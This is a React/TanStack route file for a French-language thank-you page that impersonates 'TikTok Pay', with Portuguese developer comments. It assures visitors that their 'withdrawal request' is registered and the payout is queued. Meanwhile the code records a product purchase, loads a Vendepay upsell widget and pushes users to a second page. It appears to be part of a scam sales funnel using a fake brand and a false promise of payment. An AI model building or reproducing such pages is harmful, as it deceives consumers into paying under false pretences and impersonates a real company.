import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef } from "react";
import tiktokLogo from "@/assets/tiktok-logo-clean.png.asset.json";
import { DEFAULT_PRODUCT_ID } from "@/lib/checkout-config";
import { useTikTokPurchase } from "@/lib/purchase-tracking";


export const Route = createFileRoute("/obrigado")({
  head: () => ({
    meta: [
      { title: "Demande confirmée | TikTok Pay" },
      {
        name: "description",
        content: "Votre demande de retrait a bien été reçue. Traitement en cours.",
      },
      { property: "og:title", content: "Demande confirmée" },
      {
        property: "og:description",
        content: "Votre demande de retrait a bien été reçue. Traitement en cours.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Obrigado,
});

function Obrigado() {
  const navigate = useNavigate();
  const upsellContainerRef = useRef<HTMLDivElement>(null);

  // Produto realmente comprado (o checkout envia ?productId=).
  const productId =
    (typeof window !== "undefined" &&
      new URLSearchParams(window.location.search).get("productId")) ||
    DEFAULT_PRODUCT_ID;

  useTikTokPurchase({ productId });

  // Carrega o widget de upsell da Vendepay na thank-you page.
  useEffect(() => {
    if (typeof window === "undefined" || !upsellContainerRef.current) return;

    const existing = document.getElementById("vendepay-upsell-widget-script");
    if (existing) return;

    const script = document.createElement("script");
    script.id = "vendepay-upsell-widget-script";
    script.src =
      "https://widget.vendepay.com/upsell-widget/v1/vendepay-upsell-widget-1.0.16.js?upsellId=ac1814ec-0ef7-4cf4-8844-46b2cee5efd6";
    script.async = true;
    script.onload = () => {
      if (
        window.VendepayUpsellWidget &&
        typeof window.VendepayUpsellWidget.showIframe === "function"
      ) {
        window.VendepayUpsellWidget.showIframe("vendepay-upsell-container");
      }
    };

    document.body.appendChild(script);

    return () => {
      // Não remove o script para evitar recarregamentos desnecessários.
    };
  }, []);

  return (

    <main className="min-h-screen w-full bg-[#f8f9fa] flex flex-col items-center">
      {/* Header Warning */}
      <div className="w-full bg-[#ff3b5c] py-2 px-4 text-center">
        <p className="text-white text-[11px] font-bold uppercase tracking-tight flex items-center justify-center gap-2">
          <svg viewBox="0 0 24 24" className="h-4 w-4" fill="currentColor">
            <path d="M12 2L1 21h22L12 2zm0 3.45L19.53 19H4.47L12 5.45zM11 16h2v2h-2v-2zm0-7h2v5h-2V9z" />
          </svg>
          IMPORTANT : NE FERMEZ PAS CETTE PAGE AVANT D’AVOIR TOUT LU.
        </p>
      </div>

      <section className="w-full max-w-[500px] px-6 py-12 flex flex-col items-center text-center">
        {/* Logo */}
        <img
          src={tiktokLogo.url}
          alt="TikTok"
          className="h-10 w-auto mb-10"
        />

        {/* Success Icon */}
        <div className="mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-[#25d366] shadow-[0_8px_20px_rgba(37,211,102,0.3)]">
          <svg
            viewBox="0 0 24 24"
            className="h-10 w-10 text-white"
            fill="none"
            stroke="currentColor"
            strokeWidth="3.5"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <polyline points="20 6 9 17 4 12" />
          </svg>
        </div>

        {/* Badge */}
        <div className="mb-6">
          <span className="inline-flex items-center gap-2 rounded-full border border-[#25d366]/20 bg-[#25d366]/5 px-4 py-1.5 text-[12px] font-bold text-[#25d366] uppercase tracking-wider">
            <span className="h-2 w-2 rounded-full bg-[#25d366] animate-pulse" />
            Demande confirmée
          </span>
        </div>

        {/* Main Title */}
        <h1 className="mb-8 text-[32px] font-black leading-[1.1] text-[#161823]">
          Votre demande de retrait a bien été <span className="bg-gradient-to-r from-[#ff3b5c] via-[#25f4ee] to-[#161823] bg-clip-text text-transparent">enregistrée !</span>
        </h1>

        {/* Info Card */}
        <div className="w-full rounded-[24px] bg-white p-8 shadow-[0_20px_50px_rgba(0,0,0,0.06)] text-left mb-8 border border-neutral-100">
          <p className="mb-6 text-[15px] leading-relaxed text-[#161823]">
            En raison du <span className="font-bold text-[#ff3b5c]">nombre élevé de demandes de retrait</span>, votre dossier sera traité sous <span className="font-bold underline underline-offset-2">7 jours ouvrés maximum.</span>
          </p>

          <ul className="space-y-5">
            {[
              "Votre paiement est dans la file de traitement du service financier TikTok.",
              "Vous recevrez le virement directement sur le moyen choisi lors de votre demande.",
              "Aucune action supplémentaire n’est nécessaire de votre part.",
            ].map((text, i) => (
              <li key={i} className="flex items-start gap-3">
                <svg
                  viewBox="0 0 24 24"
                  className="mt-0.5 h-5 w-5 shrink-0 text-[#25d366]"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="3"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="20 6 9 17 4 12" />
                </svg>
                <span className="text-[14px] leading-snug text-[#4a4a4a]">{text}</span>
              </li>
            ))}
          </ul>
        </div>

        {/* Footer Text */}
        <p className="mb-10 text-[12px] italic leading-relaxed text-[#8a8a8e] px-4">
          Merci de votre patience. L’équipe TikTok Pay met tout en œuvre pour débloquer votre paiement au plus vite.
        </p>

        {/* CTA Button */}
        <button
          onClick={() => navigate({ to: "/obrigado2" })}
          className="w-full rounded-2xl bg-[#ff3b5c] py-5 text-[18px] font-black text-white shadow-[0_10px_30px_rgba(255,59,92,0.3)] transition-all hover:brightness-110 active:scale-[0.98]"
        >
          CONTINUER
        </button>
      </section>
    </main>
  );
}
